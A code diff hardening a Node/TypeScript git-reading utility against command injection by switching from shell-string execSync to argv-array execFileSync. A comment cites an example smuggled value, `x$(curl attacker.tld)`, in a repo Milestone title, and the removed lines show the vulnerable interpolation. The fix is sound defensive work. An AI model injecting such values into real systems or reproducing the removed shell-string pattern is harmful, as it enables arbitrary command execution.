@@ -27,7 +27,7 @@
  * the invoking process's own working directory.
  */
 
-import { execSync } from 'node:child_process'
+import { execFileSync } from 'node:child_process'
 import { existsSync, readFileSync } from 'node:fs'
 import { join } from 'node:path'
 import {
@@ -154,21 +154,34 @@ export type PrReadContext = { prHeadSha: string; touchedFiles: Set<string> } | n
 function gitFetchMainQuiet(): void {
   try {
     // stdio: 'ignore' — this process's own stdout is the JSON report (in
-    // --json mode); nothing this shells out to may write to it. `execSync`
+    // --json mode); nothing this shells out to may write to it. `execFileSync`
     // without an explicit `stdio` already pipes the child's streams into
     // Node/Bun-internal buffers rather than the parent's real fds (verified:
     // this alone doesn't leak), but 'ignore' makes the "never touches our
     // stdout" invariant explicit rather than incidental.
-    execSync('git fetch origin main --quiet', { stdio: 'ignore' })
+    execFileSync('git', ['fetch', 'origin', 'main', '--quiet'], { stdio: 'ignore' })
   } catch {
     // best-effort — a fetch failure leaves origin/main at whatever the local
     // checkout already has; downstream reads simply fall back to that state.
   }
 }
 
+/**
+ * Both git readers below spawn `git` with an **argv array**, never a shell
+ * string (security pass, MEDIUM 2). `ref` and `relPath` are interpolated into
+ * the `<ref>:<path>` operand git itself parses, and one of those paths is
+ * assembled from a Milestone title — a value any account with write access to
+ * the repo can choose. Through a shell string, a title like
+ * `x$(curl attacker.tld)` executed; as one argv element it is a filename git
+ * fails to resolve, which both readers already treat as "absent". The `:`
+ * separator is git's own operand grammar, not shell syntax, so the argv form
+ * needs no quoting discipline to stay correct. `execFileSync` also spawns no
+ * intermediate shell process at all, so no `IFS`/`PATH` expansion sits between
+ * this file and `git`.
+ */
 function listDirAtRef(ref: string, relDir: string): string[] {
   try {
-    return execSync(`git ls-tree --name-only ${ref}:${relDir}`, { encoding: 'utf8' })
+    return execFileSync('git', ['ls-tree', '--name-only', `${ref}:${relDir}`], { encoding: 'utf8' })
       .split('\n')
       .map((s) => s.trim())
       .filter(Boolean)
@@ -179,7 +192,7 @@ function listDirAtRef(ref: string, relDir: string): string[] {
 
 function readFileAtRef(ref: string, relPath: string): string | null {
   try {
-    return execSync(`git show ${ref}:${relPath}`, { encoding: 'utf8' })
+    return execFileSync('git', ['show', `${ref}:${relPath}`], { encoding: 'utf8' })
   } catch {
     return null
   }
